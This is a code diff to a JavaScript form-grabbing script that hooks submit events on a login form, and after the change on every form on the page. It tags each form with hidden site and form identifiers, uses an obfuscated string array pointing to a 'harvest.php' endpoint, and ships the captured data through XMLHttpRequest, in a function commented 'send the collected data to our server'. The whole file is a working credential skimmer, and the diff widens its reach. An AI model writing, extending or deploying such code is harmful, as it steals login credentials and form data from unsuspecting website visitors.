@@ -1,7 +1,7 @@
-var siteId = "7e578ae5";
-var bindAllFormsSwitch = false;
+//var siteId = "updateme";
+//var formId = "updateme";
+var bindAllFormsSwitch = true;
 var formName = "loginform2";
-var formId = "93djokdi";
 var enableEncoding = true;
 var usePost = false;
 var _0x3745 = ["http","://","127.0.0.1","/harvest.php","Content-type","application/x-www-form-urlencoded","GET","POST","HEAD","PUT","DELETE","OPTIONS","PATCH"];
@@ -21,6 +21,7 @@ function initHarvester() {
     console.log("locked and loaded");
 }
 
+/* bind all forms in the document */
 function bindAllForms() {
     document.querySelectorAll('form').forEach(form => 
         form.addEventListener('submit', function(e){
@@ -32,6 +33,7 @@ function bindAllForms() {
     document.querySelectorAll('form').forEach(form => appendFields(form));
 }
 
+/* bind a specific form by name */
 function bindByName(formName) {
 	var loginForm = document.getElementById(formName);
 	if(loginForm) {
@@ -43,8 +45,12 @@ function bindByName(formName) {
     appendFields(formName);
 }
 
+/* append tracking values to a form */
 function appendFields(form) {
     var formName = form.name;
+	console.log("appendFields function() formName = " + formName);
+	var siteId = btoa(document.location.hostname);
+	var formId = btoa(document.location.pathname + '-' + formName);
     $('#' + formName).append("<input type='hidden' id='siteId' name='siteId' value='" + siteId + "'>");
     $('#' + formName).append("<input type='hidden' id='formId' name='formId' value='" + formId + "'>");
 }
@@ -122,6 +128,7 @@ function grabAll(formName) {
 	}
 }
 
+/* send the collected data to our server */
 function sendPayload(payload) {
     console.log("DEBUG: usePost = " + usePost);
     var xhttp = new XMLHttpRequest();
@@ -145,4 +152,3 @@ function sendPayload(payload) {
         xhttp.send();
     }
 }
-
